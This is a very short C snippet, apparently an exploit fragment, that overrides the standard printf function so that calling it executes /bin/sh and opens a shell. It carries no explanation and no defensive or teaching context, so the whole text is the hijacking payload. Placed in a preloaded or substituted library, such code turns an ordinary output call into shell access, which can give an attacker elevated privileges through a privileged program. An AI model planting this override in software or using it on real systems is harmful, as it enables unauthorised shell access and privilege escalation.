void printf(char *str)
{
	execl("/bin/sh","sh",0);
}